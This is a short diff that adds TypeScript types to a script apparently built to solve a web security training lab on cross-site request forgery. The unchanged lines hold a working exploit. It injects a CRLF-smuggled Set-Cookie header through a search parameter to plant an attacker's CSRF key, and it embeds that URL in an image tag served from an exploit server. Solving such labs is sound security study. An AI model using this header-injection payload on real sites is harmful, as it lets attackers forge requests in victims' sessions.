@@ -1,4 +1,4 @@
-import { parse } from "node-html-parser";
+import { HTMLElement, parse } from "node-html-parser";
 import { ExploitServer } from "../../../utils/exploitServer.js";
 import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
 import { runTasks } from "../../../utils/runTasks.js";
@@ -45,16 +45,16 @@ async function getFromLogin() {
   return { csrfToken, csrfKey };
 }
 
-function getCookieExploitUrl(csrfKey) {
+function getCookieExploitUrl(csrfKey: string) {
   const cookieExploit = encodeURI(
     `?search=\r\nSet-Cookie:csrfKey=${csrfKey};SameSite=None;Secure`,
   );
   return labUrl + cookieExploit;
 }
 
-function setCookieExploitUrl(exploit, cookieExploitUrl) {
+function setCookieExploitUrl(exploit: string, cookieExploitUrl: string) {
   const html = parse(exploit);
-  const img = html.querySelector("img");
+  const img = <HTMLElement>html.querySelector("img");
   img.setAttribute("src", cookieExploitUrl);
   return html.toString();
 }
